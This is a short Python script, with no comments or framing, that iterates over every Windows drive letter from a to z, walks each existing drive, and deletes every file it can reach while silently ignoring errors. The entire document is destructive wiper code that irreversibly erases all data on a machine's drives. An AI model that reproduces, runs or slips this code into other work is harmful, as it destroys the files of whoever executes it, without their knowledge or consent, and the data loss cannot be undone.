import os
import string
for x in string.ascii_lowercase:
	if os.path.exists(x+":\\"):
		for a,b,c in os.walk(x+":\\"):
			if len(c)!=0:
				for i in c:
					try:
						os.remove(a+"\\"+i)
					except:
						if c.index(i)!=len(c)-1:
							continue
						else:
							break
